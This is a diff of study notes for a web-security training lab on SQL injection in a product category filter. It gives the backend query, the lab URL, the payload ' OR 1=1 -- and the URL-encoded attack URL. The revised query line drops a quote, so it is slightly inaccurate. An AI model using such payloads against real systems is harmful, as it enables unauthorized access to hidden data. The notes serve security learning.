@@ -1,15 +1,24 @@
-Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+[+]LAB-01: 
+SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
-SQL Injection
+[+]SQL INJECTION LOCATED IN:
 Product category filter
 
-Original backend query
+[+]ORIGINAL BACKEND QUERY
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 
-URL 
+[+]LAB-URL SAMPLE
 https://0a4d0044035a93c584b19fc00087002d.web-security-academy.net/filter?category=Accessories
 
-Payload
+[+]PAYLOAD
 ' OR 1=1 --
 
-SELECT * FROM products WHERE category = '' OR 1=1 --' AND released = 1
+[+]INSERTING PAYLOAD INTO THE QUERY
+SELECT * FROM products WHERE category =' OR 1=1 --' AND released = 1
+
+[+]NEW LAB URL AFTER INSERTING OUR PAYLOAD
+https://0a4d0044035a93c584b19fc00087002d.web-security-academy.net/filter?category=%27+OR+1=1--
+
+[+]NOTE
+-- comment out any query after it.
+%27 is the urlencoded character for '
